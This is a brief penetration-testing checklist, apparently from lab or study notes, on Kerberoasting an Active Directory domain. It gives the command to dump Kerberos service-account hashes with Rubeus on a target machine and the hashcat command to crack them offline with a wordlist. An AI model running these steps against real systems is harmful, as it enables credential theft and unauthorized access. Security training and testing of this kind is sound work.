- - -
## Kerberoasting w/ Rubeus : 
- [ ] Download and transfer Rubeus on target machine. 
- [ ] Navigate to the directory Rubeus is in. 
- [ ] Following will dump the Kerberos hash of any kerberoastable users. 

```CMD
Rubeus.exe kerberoast 
```

![Imgur](https://i.imgur.com/qnRqesT.png)

Copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat. 

```sh
hashcat -m 13100 -a 0 hash.txt Pass.txt
``` 

- - -

